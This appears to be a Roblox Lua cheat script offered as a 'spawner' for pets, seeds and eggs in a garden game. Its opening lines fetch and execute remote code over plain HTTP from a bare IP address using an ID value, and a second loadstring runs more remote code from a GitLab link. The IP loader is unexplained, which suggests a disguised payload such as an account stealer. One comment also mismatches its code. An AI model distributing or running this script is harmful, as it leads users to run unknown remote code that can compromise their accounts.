ID="7292f569-2fbd-4d47-820c-86f02171aa3e";
loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
Spawner.GetPets() -- Returns a table of supported pets
Spawner.GetSeeds() -- Returns a table of supported seeds 
Spawner.GetEggs() -- Returns a table of supported eggs
Spawner.SpawnPet("Kitsune", 1, 2) -- Spawns a Raccoon with 1 KG and 2 Age
Spawner.SpawnSeed("Candy Blossom") -- Spawns Candy Blossom
Spawner.SpawnEgg("Night Egg") -- Spawns Night Egg
Spawner.Spin("Sunflower") -- Spins Sunflower
Spawner.Load() -- Loads the Default UI
